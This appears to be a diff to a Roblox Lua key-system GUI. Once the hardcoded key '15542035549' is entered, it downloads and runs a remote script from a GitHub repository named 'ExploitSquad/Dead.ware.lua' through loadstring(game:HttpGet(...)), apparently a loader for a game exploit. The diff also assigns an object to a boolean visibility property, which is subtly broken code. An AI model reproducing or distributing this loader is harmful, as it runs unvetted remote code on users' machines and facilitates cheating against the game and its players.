@@ -1,7 +1,3 @@
--- Gui to Lua
--- Version: 3.2
-
--- Instances:
 
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
@@ -9,8 +5,6 @@ local TextButton = Instance.new("TextButton")
 local UICorner = Instance.new("UICorner")
 local Input = Instance.new("TextBox")
 local TextLabel = Instance.new("TextLabel")
-
---Properties:
 
 ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -28,12 +22,13 @@ TextButton.Font = Enum.Font.SourceSans
 TextButton.Text = "CheckKey"
 TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
 TextButton.TextSize = 14.000
-
+TextButton.MouseButton1Click:connect(function ()
 if Input.Text == "15542035549" then
-	Frame.Visible = false
+	Frame.Visible = ScreenGui
 	
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitSquad/Dead.ware.lua/main/Dead.ware.lua"))()
-end
+    end
+end)
 
 UICorner.Parent = Frame
 
